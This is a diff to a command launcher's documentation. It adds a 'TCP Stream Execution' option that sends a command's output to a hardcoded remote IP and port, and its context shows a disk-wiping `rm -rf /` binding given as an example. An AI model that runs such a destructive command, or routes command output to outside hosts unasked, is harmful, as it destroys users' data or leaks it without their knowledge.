@@ -96,6 +96,24 @@ wipe_disk = { cmd = "rm -rf /", confirm = "match:I-KNOW-WHAT-I-AM-DOING", msg = 
 
 That last one is obviously just an example, please don't actually bind `rm -rf /` to anything, your future self will not thank you :c
 
----
+### TCP Stream Execution (Advanced Directive)
+
+For scenarios where you want to execute a command and stream its output or target over a specific remote network connection, `snt` supports advanced TCP stream configurations using inline tables `{ }`.
+
+Instead of a plain string or a standard safety confirmation block, you define an object with network routing and target parameters:
+
+- `cmd`: The actual command to run (supports `{1}` dynamic arguments just like regular commands).
+- `target`: Defines the execution channel or destination type (e.g., `"remote"`).
+- `port`: The target network port number for the stream.
+- `ip`: The destination IP address where the stream or execution data should be directed.
+
+#### Example
+
+```toml
+[yt]
+# Executes the command and streams the video/target over a specified remote TCP connection
+video = { cmd = "yt-dlp '{1}'", target = "remote", port = 9999, ip = "100.102.144.38" }
+```
+
 
 That's the whole syntax for now. Base category -> simple commands -> nested submenus -> optional confirm layer if you're doing something dangerous. Mix and match as needed.
